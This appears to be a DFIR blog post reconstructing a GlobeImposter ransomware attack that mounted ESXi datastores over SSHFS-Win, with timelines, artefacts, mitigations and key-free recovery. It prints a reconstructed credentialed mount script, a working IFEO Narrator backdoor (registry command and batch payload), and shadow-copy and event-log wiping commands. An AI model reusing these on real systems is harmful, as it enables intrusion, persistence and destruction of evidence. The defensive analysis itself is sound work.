---
template: post.html
title: "Encrypting an ESXi estate without ever running code on ESXi"
date: 2026-08-11
authors:
  - Zhymabek Roman
tags: dfir ransomware esxi globeimposter sshfs veeam forensics ntfs incident-response
hide: [toc]
---

A GlobeImposter affiliate encrypted 34 virtual machine disks — 21.87 TB — across an eleven-host ESXi estate in a single evening. They never ran a single line of code on a hypervisor. No `esxcli`, no Linux ELF encryptor, no Python script dropped into `/tmp`, no `vim-cmd vmsvc/power.off` loop. The entire ESXi-ransomware detection playbook that the industry built between 2021 and 2024 would have caught precisely nothing.

Instead they harvested ESXi root credentials from a browser password store, mounted all eleven VMFS datastores as **Windows drive letters** over SSHFS-Win, and ran one 54 KB Windows encryptor across every mount at once.

From the hypervisors' point of view, this was an authenticated root SSH session performing SFTP writes. Which is what an administrator moving files looks like.

This post is a writeup of the forensic reconstruction: the technique, the toolkit, the seventeen-hour operator shift rebuilt second-by-second from artefacts that survived a deliberate seven-script wipe, why 97 % of the data came back without paying, and — the part I care most about — the claims I had to retract along the way and the analytical traps that produced them.

Everything identifying is removed: organisation, hosts, accounts, credentials, campaign identifiers, operator contact addresses. Internal addresses appear as `<esxi-01>`-style placeholders. What is left is tradecraft, artefact behaviour, and method.

!!! abstract "TL;DR"

    - **Technique:** ESXi datastores mounted as Windows drive letters via SSHFS-Win + WinFsp; one Windows encryptor walked eleven mounts. Zero hypervisor-side execution.
    - **Damage:** 85 MiB of ciphertext against 21.87 TB of virtual disks. 0.0004 % of bytes destroyed.
    - **Recovery:** 33 of 34 disks (97 %) recovered *without the key*, from backup GPT headers, ext4 backup superblocks and NTFS backup boot sectors that all sit outside the malware's fixed blast radius.
    - **Bonus recovery:** ~50 % of every small encrypted file survives as plaintext. A browser's encrypted master-key store yielded all 40 stored credentials.
    - **Forensics:** event logs were annihilated (137 channels cleared, Event Log service deleted). USN, MFT `SI`-vs-`FN`, RDP bitmap cache, UserAssist, Amcache and PCA reconstructed the session anyway.
    - **Anti-lesson:** runlist-based file recovery on a thin-provisioned TRIM volume produces *convincing false positives*. One nearly became a published IOC.

---

## 1. The environment, in the abstract

One Windows backup server. Eleven ESXi hosts across two internal /24s. 34 flat VMDKs totalling 21.87 TB. A vCenter. A domain controller. An application server. Standard mid-size estate.

The backup server is the important character here, and not because it holds backups. It holds:

- **install rights** and a logged-in administrator profile,
- **network reach to every hypervisor** by design,
- a backup product whose configuration database stores **decryptable credentials for everything it has ever authenticated against** — vCenter, ESXi root, guest-OS accounts used for application-aware processing, SQL, cloud repositories,
- and, in this case, a browser with 40 saved passwords, because it doubled as somebody's workstation.

It also doubled as somebody's *personal* workstation: a torrent client with 43 GiB of lifetime traffic, cracked software from a well-known warez portal, a cracked licence for the backup product itself, and a WinPE rescue toolkit from a Russian tracker. That is the leading hypothesis for initial access. It is not proven, and I will come back to why I refuse to state it as fact.

---

## 2. The technique: SSHFS-Win as a ransomware transport

At 11:47 on the attack day the operator installed two MSIs: **WinFsp** (a FUSE-alike user-space filesystem driver for Windows) and **SSHFS-Win** (an SFTP client that presents a remote path as a Windows filesystem). Both are legitimate, signed, widely used open-source software.

Ten hours later, at 21:09:13, a PowerShell script was written to disk. **2.6 seconds later** the first mount registered. Eleven mounts came up roughly one second apart, finishing at 21:09:26.

The script was reconstructed from RDP bitmap-cache tiles — partial visibility, key lines legible:

```powershell
$login = "root"
$password = "<harvested>"
$ips = Get-Content "ip.txt"
foreach ($ip in $ips) {
    $path = "\\sshfs\root@$ip\vmfs"
    $letter = (65..90 | Where-Object { -not (Get-PSDrive -Name ([char]$_) -EA 0) })[0]
    net use "$([char]$letter):" $path /user:$login $password
}
```

Twelve lines. `ip.txt` was exactly 158 bytes — eleven addresses, one per line.

That reconstruction was later confirmed against a **primary source**: `HKCU\Network`, which the kernel writes at connect time and which nobody thinks to wipe.

| Drive | RemotePath | Key lastwrite (UTC) |
| ----- | ---------- | ------------------- |
| `A:` | `\\sshfs\root@<esxi-01>\vmfs` | 21:09:17 |
| `B:` | `\\sshfs\root@<esxi-02>\vmfs` | 21:09:18 |
| `H:` | `\\sshfs\root@<esxi-03>\vmfs` | 21:09:18 |
| `I:` | `\\sshfs\root@<esxi-04>\vmfs` | 21:09:20 |
| `J:` | `\\sshfs\root@<esxi-05>\vmfs` | 21:09:21 |
| `K:` | `\\sshfs\root@<esxi-06>\vmfs` | 21:09:22 |
| `L:` | `\\sshfs\root@<esxi-07>\vmfs` | 21:09:23 |
| `M:` | `\\sshfs\root@<esxi-08>\vmfs` | 21:09:24 |
| `N:` | `\\sshfs\root@<esxi-09>\vmfs` | 21:09:24 |
| `O:` | `\\sshfs\root@<esxi-10>\vmfs` | 21:09:25 |
| `P:` | `\\sshfs\root@<esxi-11>\vmfs` | 21:09:26 |

Every entry carries `UserName = root` and `ProviderName = Windows File System Proxy` — WinFsp's provider string. That is the mechanism confirmed from the kernel's own bookkeeping rather than from squinting at 64×64 pixel tiles.

Two of the letter mappings I had originally read off the bitmap cache were **wrong** — off by one host each. The registry corrected them. But notice what the corrected allocation is: `A B H I J K L M N O P`. C through G were already in use on that machine. That is *exactly* what the free-drive-letter loop in the reconstructed script predicts, and the script came from an independent artefact. When a reconstruction's logic predicts an observation made from a different source, the reconstruction is structurally right even where individual details were misread. That is worth more than either artefact alone.

Encryption across the eleven mounts ran **21:20–21:26** as a single Windows process walking drive letters.

### 2.1 What the hypervisors saw

Nothing worth an alert.

- No ransomware process on ESXi. Nothing in hypervisor telemetry to detect, because nothing hypervisor-side executed.
- The encryption load presents as **an outbound SSH/SFTP session from a legitimate management host to each hypervisor**, authenticating as root with valid credentials.
- No `esxcli` invocations. No shell scripts. No unknown binaries staged in `/tmp` or `/vmfs/volumes`. No VM power-off loop — the classic ESXi-encryptor tell, since most families must stop VMs to get exclusive access to their disks. This one did not bother: intermittent encryption of a running VM's flat VMDK works fine when you only intend to destroy 2.5 MiB of it.
- Modern ESXi does not log SSH source addresses the way older versions did, so even the surviving hypervisor auth logs are thin.

The detection surface, such as it is, is on the Windows side and in the network:

1. **WinFsp / SSHFS-Win driver and service installation** on a server. A backup server has no legitimate reason to mount VMFS over SFTP. This is a high-signal, low-noise EDR rule and almost nobody has it.
2. **`net use` mapping a `\\sshfs\...` UNC path.** The provider string `Windows File System Proxy` in `HKCU\Network` is equally distinctive.
3. **Volume and duration of SFTP writes** from one host to every hypervisor simultaneously, at 21:20 on a Sunday.

### 2.2 The prerequisites were mundane

1. **ESXi root credentials for all eleven hosts.** Obtained that morning in an eight-minute window (05:17–05:25) by browsing to each host's web UI and letting the browser's password manager offer the saved credential. The password family was shared across vCenter, every ESXi host, the routers and the cloud tenant. The browser password store *was* the estate.
2. **Install permission on a Windows host with reach.** The operator had the administrator account.
3. **SSH enabled on every hypervisor.** It was. It still was, long after the incident, on every host that was checked.

### 2.3 It broke, and the breakage is visible in the ciphertext

At **21:27:37.923** `sshfs.exe` crashed, writing an `sshfs.exe.stackdump` next to itself. Cygwin-based SSHFS is not built for eleven concurrent SSH channels under sustained high-fanout write load. When it died, the mounts went away mid-run.

The operator noticed and re-ran the encryptor eleven minutes later. That is not an inference from behaviour — it is legible in the ciphertext itself. Every encrypted image carries an appended trailer, and the trailers hash into exactly two groups:

| Blob | Images | Which run |
|---|---|---|
| A | 29 | first pass, before the crash |
| B | 5 | second pass, after the crash, on whatever was still mountable |

Two blobs, two encryption events, one crash between them. The malware documented the operator's operational failure for us.

### 2.4 Mitigations this specifically argues for

- ESXi SSH **disabled by default**, enabled only inside time-boxed maintenance automation. It is the single control that would have stopped this cold.
- **Lockdown Mode** for root access.
- **Key + FIDO2** authentication rather than one shared root password across eleven hosts.
- **EDR rules for WinFsp/SSHFS-Win** installation and for `\\sshfs\` UNC mounts on Windows management hosts.
- Treat the **backup server as tier-0**. It is not a file server that happens to hold copies; it is a credential vault with network reach to every hypervisor and guest in the estate.

### 2.5 Attribution fingerprint

SSHFS-Win + WinFsp + `\\sshfs\root@<ip>\vmfs` + GlobeImposter is a distinctive tradecraft combination. As of this engagement I could not find it documented in any public affiliate profile for GlobeImposter or for the Phobos-family operators whose kit this affiliate otherwise uses verbatim. If you have seen this pattern in another engagement, that is a linkage worth making.

---

## 3. The toolkit: 121 files in three two-letter folders

The kit landed in the administrator's `Music\` folder in **53 seconds** (04:27:36–04:28:29). 121 files, three subfolders, each named with two letters or one:

- **`mi\`** — mimikatz and credential dumpers
- **`ns\`** — network scanner, persistence, remote access, backup-product-specific tooling
- **`e\`** — executor / loader

The naming is not obfuscation, it is ergonomics: short folder names keep the relative paths inside the batch scripts short. Every script references its siblings relatively — `..\mi\mimikatz\x64\mimikatz.exe`, `..\e\ip.txt` — so the kit drops as a unit into any user-writable directory and works without modification. It is a *portable, path-independent* toolkit. That design detail tells you this operator does this often.

### 3.1 `mi\` — credential dumping

35 files. Reconstructed from the USN journal (which caught every CREATE between 04:28:18 and 04:28:29) and from MFT records that survived the toolkit being sent to the Recycle Bin at 21:19.

```
mi\
├── 0.start.bat                      3,291 B   entry-point wrapper
├── 1.Automim.bat                    4,114 B   automated mimikatz launcher
├── 3.Install_MimPassHunter.bat        484 B
├── 3.ViewPassMimLsa.bat               716 B
├── CredentialsFileView.exe        116,944 B   NirSoft — Credential Manager / DPAPI reader
├── CredentialsFileView64.exe      155,856 B
├── CredentialsFileView64.cfg          482 B   ← config mtime = when the tool RAN
├── PassMimLsa.txt                      18 B   output, near-empty at recycle time
├── WebBrowserPassView.exe         462,336 B   ← this is what took the 40 browser credentials
├── credentialsfileview-x64\ …
└── mimikatz\
    ├── kiwi_passwords.yar           2,834 B
    ├── miparser.vbs                 5,172 B
    ├── x32\ {mimidrv.sys, mimikatz.exe, mimilib.dll, mimilove.exe, mimispool.dll}
    └── x64\
        ├── mimikatz.exe         1,355,264 B
        ├── mimidrv.sys             37,208 B   signed kernel driver
        ├── mimikatz.log               162 B   ← the smoking gun
        ├── CMDAsAdmin.bat             421 B
        └── mimstart.bat                30 B
```

**`mimikatz.log`, 162 bytes, mtime 04:28:27.** A log file exists only if the binary ran. 162 bytes is about the size of a banner plus one command sequence — consistent with a scripted single-shot `sekurlsa::logonpasswords` or `lsadump::sam` fired from `1.Automim.bat`. Mimikatz was **executed**, not merely staged, within a minute of the kit landing.

The output went to files named `NTLM.txt` and `Result.txt`. Neither survives on disk — but both were caught **open in Notepad** in the RDP bitmap cache later that evening. So we know the dump succeeded, we know the operator read it, and we cannot read it ourselves.

This matters for scoping. The 40 browser credentials that *were* recovered are only what `WebBrowserPassView.exe` produced. The mimikatz and Credential-Manager output is a **separate, larger, unrecovered credential trove**. Rotation planning has to assume the superset.

### 3.2 `ns\` — scanning, persistence, remote access

28 files plus a full Process Hacker distribution. The interesting ones:

| File | Size | Note |
|---|---|---|
| `netscan.exe` | 11.2 MB | SoftPerfect Network Scanner, portable |
| `netscan.lic` | 832 B | **licence refreshed two weeks before the attack** |
| `netscan.xml` | 122 KB | saved scan profiles and prior results |
| `oui.txt` | 1.2 MB | MAC vendor DB — they brought the offline lookup tables |
| `GeoLite2-Country.mmdb` | 3.9 MB | MaxMind geoIP DB, same reason |
| `PsExec.exe` | 339 KB | lateral execution over 445/135 |
| `AnyDesk.exe` | 4.0 MB | unattended remote access — **staged, never run** |
| `cmd_pass.exe` | 313 KB | executed 04:31:12 |
| `RpcSsv.exe` | 45 KB | service masquerade — the name mimics `RpcSs` |
| `fndr.vbs` | 23.8 KB | file finder / recon |
| `wallfnd.vbs` | 6.0 KB | **wallet-file finder** |
| `InstallNetCat.vbs` | 2.4 KB | netcat installer |
| `Hyper-V Detect.vbs` | 853 B | environment detection |
| `openrdp.bat` | 303 B | enables RDP on a target |
| `defoff.bat` / `turnoff.bat` | 3.6 / 33 KB | Defender kill, broad service kill |
| `Veeam-Get-Creds.ps1` | 2,422 B | **the specialisation — see below** |
| `Process Hacker 3.0\` | ~14 MB | including `kprocesshacker.sys`, `NSudoAPI.dll`, 30+ plugins |
| `Defender Control v2.1\` | ~1.4 MB | signed userland Defender killer, two variants |

Three observations.

**The licence file was refreshed two weeks before the attack.** The operator maintains a *licensed* working copy of a commercial network scanner between engagements. This kit is not disposable, and it is not a one-off download. It is a professional's tool bag.

**The privilege-escalation stack is three-tier.** `Defender Control` kills AV in userland. `NSudoAPI.dll` / `NSudoDM.dll` provide SYSTEM and TrustedInstaller elevation. `kprocesshacker.sys` is a signed kernel driver, and Process Hacker's driver is a well-known BYOVD candidate for terminating protected processes from kernel space. Plus `TerminatorPlugin.dll` and `TrustedInstallerPlugin.dll` in the plugin set. Whatever the AV situation had been, the kit had three independent answers to it.

**`wallfnd.vbs` and `fndr.vbs` are the pre-encryption sweep.** A wallet-file finder in a ransomware kit is a reminder that these operators monetise opportunistically — crypto wallets, browser stores, documents worth exfiltrating — before the encryption event that ends their access.

#### The one bespoke component

`Veeam-Get-Creds.ps1` is 2,422 bytes of public PowerShell, dropped in unmodified. What it does:

1. reads `HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\` for `SqlServerName`, `SqlInstanceName`, `SqlDatabaseName`,
2. opens the backup product's configuration database through `System.Data.SqlClient`,
3. decrypts every stored credential — vCenter, ESXi root, Windows and Linux guest-OS accounts, SQL, backup-target hosts, cloud repositories,
4. prints them in plaintext.

It is published on GitHub for "demonstration and academic purposes". This operator dropped it into an otherwise commodity Phobos-lineage kit. **That is the only target-specific component in 121 files** — and it is the one that turns a compromised backup server into a compromised estate.

We know it was *attempted*: the bitmap cache caught it open in PowerShell ISE at 13:44, with the script's own comment banner readable across several tiles and output lines at the bottom of the window showing a connection attempt to the config DB. Whether it reached the `catch { exit -1 }` branch is not readable from fragmented tiles. It does not really matter for planning — you have to assume it worked.

### 3.3 `e\` — the loader

The smallest folder and the entry point.

```
e\
├── scan.exe                             stager / loader
├── Export_1.2.vbs                       wrapper
├── dotnet-runtime-6.0.19-win-x64.exe    executed 13:58:39
├── ip.txt                        158 B  the eleven hypervisor addresses
├── log.txt                              execution log — contents gone
└── start.bat                            ← does not appear in the MFT inventory
```

The **.NET runtime installer being executed at 13:58** is one of my favourite details in the whole case. It is not administrator maintenance. It is the operator discovering that a component of their kit needs a runtime that is not present, installing it, and *then* proceeding — seven hours before deploying the payload. That is dependency-checking. It is what "prep for main event" looks like in artefacts.

And `start.bat`, which UserAssist says ran at 13:58:39, **does not exist in the MFT-derived inventory of that folder**. The kit had at least one component more than I could reconstruct. Every inventory in an incident report is a lower bound.

---

## 4. The seventeen-hour shift

All times UTC. Sources per line noted where they are interesting — `[USN]` change journal, `[MFT]` `$STANDARD_INFORMATION` timestamps, `[UA]` UserAssist, `[PCA]` Program Compatibility Assistant, `[AMC]` Amcache.

```
04:27:03  AzureArcSetup.exe + shortcut written                          [MFT]
04:27:15  Windows Security UI opened — 14 seconds of focus              [UA]
04:27:36  121-file toolkit drop begins                                  [MFT]
04:28:29  …toolkit drop complete (53 seconds)                           [MFT]
04:28:27  mimikatz.log written — mimikatz ran                           [MFT]
04:29:33  IFEO hijack #1 planted: mpcmdrun.exe -> systray.exe
04:31:00  Defender Control run (installer failed)                       [PCA]
04:31:06  cmd_pass.exe — 2 seconds of focus                             [UA]
04:31:11  IFEO hijack #2 planted: narrator.exe -> comm.bat
04:31:13  netscan.exe — first of 43 focus events                        [UA]
05:17     ESXi root credentials harvested from browser…                 [browser store]
05:25     …eleven hosts, eight minutes
06:16:16  CredentialsFileView64.exe, first run, 76 s of focus           [UA]
07:07:23  CredentialsFileView64.exe again                               [PCA]
11:47     WinFsp + SSHFS-Win MSIs installed
13:04:27  failed logon on the administrator account                     [SAM]
13:44:38  PowerShell ISE launched — 127 s of focus                      [UA]
13:44:52  ISE file-open dialog (MRU: ps1, txt)                          [UA]
13:58:13  .NET 6.0.19 runtime installer                                 [UA]
13:58:39  e\start.bat — the file that isn't in the inventory            [UA]
14:13:23  systray.exe inventory event — the IFEO redirect firing        [AMC]
18:24     two backup restores of the main production VM (HotAdd)
21:09:13  mount_drives.ps1 written                                      [USN]
21:09:16  first sshfs mount registers (2.6 s later)                     [registry]
21:09:17  net.exe — the net use loop                                    [AMC]
21:09:26  eleventh mount up
21:09:44  Process Hacker — 127 s of focus                               [UA]
21:17:49  Defender Control, 2 runs                                      [UA]
21:17:56  WScript.exe, 3 runs — first proof any staged .vbs executed    [UA]
21:18:42  DL.exe #1 written to C:\ and timestomped                      [USN]
21:19:06  121-file toolkit moved to the Recycle Bin                     [USN]
21:20     datastore encryption pass begins across 11 mounts
21:26     …datastore pass ends
21:27:01  DL.exe #2 written to AppData\Local (3 ms write, timestomped)  [USN]
21:27:01  marker file created in Users\Public (+3 ms)                   [USN]
21:27:01  first local C: file encrypted (+201 ms)                       [USN]
21:27:25  lod.bat written, timestomped to June 2023                     [USN]
21:27:37  sshfs.exe crashes — stackdump written, mounts die             [USN]
21:28:45  logdel1–7.bat created and self-deleted — 7 scripts in 76 ms   [USN]
21:28:46  attrib.exe                                                    [AMC]
21:28:49  timeout.exe — pacing                                          [AMC]
21:28:53  vssadmin.exe + wmic.exe — shadow copy destruction             [AMC]
21:28:54  bcdedit.exe — recovery disabled                               [AMC]
21:29:33  137 Windows event channels cleared                            [USN]
21:29:36  net1.exe — service stop                                       [AMC]
21:30:31  outbound RDP (mstsc) — 4 runs, 1,748 s cumulative focus       [UA]
21:38:12  DL.exe run count reaches 2                                    [UA]
21:38:29  DL.exe second execution                                       [PCA]
--- next day ---
00:33:47  DL.exe #1 deleted — first cleanup pass                        [USN]
05:56:58  final encryption burst on C:                                  [USN]
06:09:08  operator RDP logon
06:19:28  DL.exe #2 deleted — second cleanup pass                       [USN]
06:19:39  RunOnce key written, then emptied (+11.7 s)                   [registry]
```

### 4.1 Two encryptors, not one

For a while, three observations looked contradictory: PCA logged the payload path as a bare `\DL.exe`; SRUM's application ID mapped it to a volume-root path on a different volume number than the one recorded for older artefacts; and a recovered Explorer screenshot showed `DL` (54 KB) sitting in a root-directory listing next to a `.ppk` file and `lod.bat`.

A full USN sweep resolved it. There were **two `DL.exe` files with two separate MFT records**, dropped 8 minutes 19 seconds apart:

```
DL.exe #1 — MFT rec 5612 — C:\DL.exe
  21:18:42.128  CREATE
  21:18:42.128  EXTEND|CREATE
  21:18:42.324  OVERWRITE|EXTEND|CREATE
  21:18:42.326  BASIC                         ← SetFileTime() = timestomp
  21:18:42.326  OVERWRITE|EXTEND|CREATE|CLOSE
  (next day) 00:33:47.017  DELETE|CLOSE       ← first cleanup pass

DL.exe #2 — MFT rec 3214 — C:\Users\<admin>\AppData\Local\DL.exe
  21:27:01.126  CREATE
  21:27:01.129  OVERWRITE|EXTEND|CREATE|BASIC|CLOSE   ← 3 ms write + timestomp
  (next day) 06:19:28.092  DELETE|CLOSE       ← second cleanup pass
```

PCA was not truncating a path; it was accurately logging the root copy. The SRUM volume-number mismatch was real too — `HarddiskVolume` numbering had shifted between 2024 and 2026 as disks were attached and detached, which is a nice reminder that device paths in SRUM are not stable identifiers across time.

The 11-minute gap between invocations is the window in which the operator noticed the crash. The two encryptor runs map onto the two ciphertext blobs.

And the **06:19:39 RunOnce write-then-empty, 11.7 seconds after the second binary was deleted**, tells you the next-morning logon was a deliberate cleanup visit, not a check-in. Someone came back specifically to tidy up.

### 4.2 The exfiltration-shaped hole

At **18:24 — three hours before encryption, on a Sunday night** — two backup restore operations landed on the box: `<prod-vm>_restored` and `<prod-vm>_clone`, both fresh copies of the organisation's main production VM, mounted via **HotAdd** (disks attached directly to the backup proxy so their contents can be browsed without booting the guest).

Neither destination VM exists in vCenter today. The restore-agent logs — 30 of them — are all deleted, all with reused clusters. The MFT metadata establishes that the operation happened; the *contents* of what was browsed are unrecoverable.

That is the operational signature of **restore → browse → extract → clean up**, executed against the crown-jewel VM immediately before the encryption event. No staging folder was found, no archive, no egress evidence on disk. Which brings me to the thing that is *still* unexamined and that I want to flag loudly for anyone doing this kind of work:

**An Azure Storage Explorer profile was installed on the ransomed server.** `%AppData%\Roaming\StorageExplorer\` with `Local Storage\leveldb`, `Session Storage`, `Network`, and Code Cache directories all present. That is a GUI blob-upload client. Its LevelDB state retains account names, subscription IDs, storage-account names and recent-connection history. Unlike an SMB copy, **it leaves local state**. It is the single most promising unexplored exfiltration lead in the entire engagement, and the scripts that touched that path in this investigation only enumerated it in the MFT — they never parsed its contents.

If you take one operational habit from this post: when you cannot find the exfil channel, inventory the *cloud storage clients* installed on the box before you conclude it went out over SMB.

---

## 5. Persistence: two IFEO hijacks with two different jobs

Image File Execution Options is a registry key where a `Debugger` value makes Windows launch a **different** program instead of the named one. Two were planted 98 seconds apart:

| Target | Debugger | Purpose |
| ------ | -------- | ------- |
| `mpcmdrun.exe` | `systray.exe` — genuine signed 32 KB Microsoft inbox stub | **Neutering** |
| `narrator.exe` | `comm.bat` — attacker script, 215 B, recovered | **Backdoor** |

An earlier draft of my analysis treated both debugger targets as unrecovered attacker binaries, which was wrong and which mattered. Amcache resolved `systray.exe` to a genuine, signed, `IsOsComponent = 1` Microsoft binary of 32,768 bytes. So the first hijack is not payload delivery at all — it is **Defender's own command-line interface being redirected to a harmless do-nothing OS component**. Every scheduled scan, every signature update, every remediation task now silently no-ops. Nothing malicious executes, so there is nothing malicious to detect. It is cleaner tradecraft than dropping a fake `mpcmdrun.exe` would have been.

The second hijack is the one I find genuinely elegant. Installer, 149 bytes, one command:

```bat
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /f /v Debugger /t REG_SZ /d "%windir%\comm.bat"
```

Payload, 215 bytes:

```bat
MODE CON: COLS=45 LINES=1
@Echo off
color 02
title
cls
:Password
Set input=
set /p input=
if "%input%"=="<code>" goto YES
if not "%input%"=="<code>" goto NO
exit

:YES
Start cmd.exe
Exit

:NO?
exit ?
```

A green terminal window **one line tall and 45 columns wide**, showing nothing but a cursor. Type the right code, get a fully privileged `cmd.exe`. Type anything else, it exits silently.

The trigger is the point. `narrator.exe` is the Windows accessibility screen reader, and it is reachable **from the RDP login screen** — `Win+Ctrl+Enter`, or the Ease of Access button — *before authentication*. So the access path is: reach any RDP login screen on this host, invoke Narrator, receive a SYSTEM shell.

The passcode gate is not security, it is camouflage: a legitimate admin who stumbles into it sees a tiny blank box that closes itself. (The specific code is a well-known neo-Nazi numeric string, commonly used as a signature by Russian-speaking underground actors. I am not reprinting it; treat any hardcoded four-digit gate in a batch file with the same suspicion.)

364 bytes across two files. No service, no scheduled task, no Run key, no startup folder, nothing in any of the places persistence hunters look first. And it survives every credential rotation you perform, because it does not need a credential.

---

## 6. Anti-forensics: seven scripts in 76 milliseconds

The wipe kit is seven batch files, **all created and self-deleted inside the same second** — 21:28:45.517 to 21:28:45.593. Each ends with `del "%~f0"`.

| Script | What it destroys |
| ---- | ------------- |
| `logdel1.bat` | RDP connection history — the `HKCU\...\Terminal Server Client` registry tree, `Default.rdp` |
| `logdel2.bat` | **All** Windows event logs via `WEVTUTIL CL`; then stops and *deletes* the `eventlog` and `wscsvc` services and disables Security Center |
| `logdel3.bat` | Prefetch, `%TEMP%`, cookies, recent files, IE cache, Recycle Bin, Jump Lists |
| `logdel4.bat` | A specific Jump List file, plus `*.tmp` drive-wide |
| `logdel5.bat` | Drive-wide `*.log`, `*.bak`, `*.chk`, `*.old`, `*._mp`, `*.gid` |
| `logdel6.bat` | **VSS and backup destruction** — `vssadmin Delete Shadows /All /Quiet`, `wmic SHADOWCOPY DELETE`, all `wbadmin` backups, `bcdedit /set {default} recoveryenabled No`, `bcdedit /set {default} bootstatuspolicy ignoreallfailures` |
| `logdel7.bat` | Unknown — the only one whose content is permanently unrecoverable |

Six of seven were recovered **because they were MFT-resident**: a file small enough to fit in its MFT record stores its `$DATA` inline, so deleting it leaves the content in the record until that record is reused. `logdel7.bat` at 1,411 bytes was non-resident, its clusters were reallocated, and it is gone forever.

Two things about this sequence deserve emphasis.

**`logdel2.bat` is why there is no event log evidence at all.** It does not just clear channels — it deletes the Event Log service. 137 channels cleared at 21:29:33.

**The shadow-copy destruction ran 104 seconds *after* encryption started.** `DL.exe` began writing ciphertext at 21:27:01.327; `logdel6.bat` fired at 21:28:45. VSS destruction was not preparation, it was cleanup, executed concurrently with the encryption pass. By the time shadow copies died, the local disk was already being encrypted.

And it did not matter, because recovery ended up depending on something no wiper can reach: backup GPT headers *inside the malware's own skip gaps*. The attacker's throughput optimisation preserved the exact metadata their wiper was trying to eliminate.

### 6.1 Timestomping, and the artefact that defeats it

Every operator-dropped file carries a `BASIC` USN reason immediately after its write. `BASIC` means `NtSetInformationFile(FileBasicInformation)` — i.e. `SetFileTime()`. They forged `$STANDARD_INFORMATION` on each drop so Explorer would show the files as pre-existing.

| File | True create (USN) | Displayed in Explorer |
|---|---|---|
| `lod.bat`, 8 KB | 21:27:25.336 | **2023-06-05 09:34** |
| `DL.exe` #1, 54 KB | 21:18:42.128 | earlier same day |
| `DL.exe` #2 | 21:27:01.126 | earlier same day |

Two independent defeats:

1. **`$STANDARD_INFORMATION` is user-settable. `$FILE_NAME` is not.** FN is kernel-maintained and only refreshed on rename, move or hardlink. Comparing SI against FN separates the claimed timeline from the actual one.
2. **The USN `BASIC` reason survives the file.** Even after the binary is deleted and its clusters reclaimed, the journal still records that someone called `SetFileTime()` on it, at what time, on which file reference.

The same SI-vs-FN comparison did real work elsewhere in this case. A cryptominer directory on the volume showed:

```
                  SI.create                FN.create                delta
xmrig.exe         2024-02-03 13:44:59.877  2024-02-03 14:00:54.851  +955 s
config.json       2024-02-03 13:44:59.655  2024-02-03 14:00:54.788  +955 s
WinRing0x64.sys   2024-02-03 13:44:59.846  2024-02-03 14:00:54.851  +955 s
```

A 16-minute SI/FN gap with fresh FN timestamps means these files were **copied onto this volume** from somewhere else, not extracted here: a copy tool restored the source's SI timestamps while the kernel stamped new FN values. Meanwhile the binary's own mtime matched its PE compile timestamp *to the second* — that is the vendor's build time, preserved through the copy. Three distinct dates in one folder: when the software was built, when it was created at its original location, and when it arrived here.

---

## 7. The payload: 85 MiB of ciphertext against 21.87 TB

The malware renames its victims `*.vmdk.doglock`. It does not encrypt virtual disks. It encrypts **2.5 MiB of each virtual disk**.

| Measurement | Value |
|---|---|
| Ciphertext per image | **2.5 MiB** — 1.25 MiB at the head, 1.25 MiB at the tail |
| Pattern | **8 KiB encrypted / 8 KiB skipped**, 160 iterations at each end |
| Region covered | first 2,621,440 bytes and last 2,621,440 bytes |
| Appended trailer | 944 or 992 bytes |
| Total ciphertext, whole estate | **≈ 85 MiB** |
| Data held hostage | **21.87 TB** |
| Fraction of bytes destroyed | **0.0004 %** |
| Disks recoverable without the key | **33 of 34 (97 %)** |

```
########........########........########........########........########........
```

Eight kilobytes on, eight off. Same at the tail:

```
########........########........########........########.......o########.......o
                                                       ↑ backup GPT header lives here
```

The pattern is **file-offset aligned, not filesystem aligned**. It has no idea what it is hitting. On a 4.6 TB disk it does exactly as much work as on a 25 GiB one. Intermittent encryption is a throughput decision: lock the whole datastore before anyone notices, rather than encrypt one VM properly.

### 7.1 What 2.5 MiB at each end actually destroys

| Structure | Location | Fate |
|---|---|---|
| MBR / protective MBR | LBA 0 | **destroyed**, all 34 images |
| Primary GPT header + entry array | LBA 1–33 | **destroyed** |
| First partition's NTFS boot sector | LBA 2048 | **destroyed** |
| ext4 primary superblock | partition + 1024 B | **destroyed** where the partition starts inside 2.5 MiB |
| LVM PV label + metadata area | partition start | **destroyed**, same condition |
| Backup GPT entry array | last 33–1 sectors | partially destroyed — entries 5–68 overwritten |

Enough to make every disk unbootable and unmountable. Which is the entire point: the malware is not destroying data, it is destroying the *addressing* of data, because that is 0.0004 % of the work for approximately the same leverage.

### 7.2 Why 97 % came back anyway

Four redundancy mechanisms sit outside the blast radius, and a fifth quirk helps:

1. **The backup GPT header survives — in every single image.** The pattern's final skip gap is 8 KiB wide; the GPT header occupies the disk's last 512 bytes. It lands in a gap every time. All 13 GPT-partitioned disks had a backup GPT with **valid CRC32**.
2. **ext4 writes backup superblocks every 32,768 blocks.** With 4 KiB blocks the first one is 128 MiB in — fifty times beyond the malware's reach. Mount directly: `mount -t ext4 -o ro,norecovery,sb=131072`.
3. **NTFS keeps a backup boot sector at the end of every volume.** Every NTFS guest came back this way. The backup VBR also hands you the volume's true geometry: start offset, cluster size, `$MFT` location.
4. **Large partitions start beyond 2.5 MiB** and are entirely untouched, primary superblock included.
5. **`$MFT` is not at the start of an NTFS volume.** Windows places it around cluster 786,432 — roughly 3 GB in. The master file table was never at risk.

The recovery procedure, in outline: rebuild the protective MBR and primary GPT from the backup GPT at the tail; for each partition, locate the filesystem by signature; for NTFS, copy the backup VBR from the volume's last sector to its first; for ext4, mount with an explicit backup superblock; for LVM, reconstruct the PV label from the metadata area copies. Then image the guest filesystem out to clean storage — do not attempt to run the recovered disk in place.

### 7.3 The trailer

```
┌──────────────┬────────────────────────────────────┬──────────────┐
│ 128 bytes    │ 768 bytes                          │ 48 or 96 B   │
│ binary,      │ ASCII hex text: 16 lines of        │ binary,      │
│ per-image    │ "XX XX .. XX\n"  → 256 bytes       │ per-image    │
└──────────────┴────────────────────────────────────┴──────────────┘
                total: 944 or 992 bytes
```

The middle 768 bytes are **256 bytes of binary written as human-readable hex** — 2048 bits, consistent by length with an RSA-2048-wrapped per-file symmetric key. The leading 128 bytes vary per image (key-derivation material). The trailing 48 or 96 bytes are a fixed campaign marker.

Writing the wrapped key as ASCII hex is an odd choice and a gift to responders: `strings` on the last 4 KiB of any affected file yields the campaign identifier and lets you group images by encryption run in seconds. That is how the two blobs above were found.

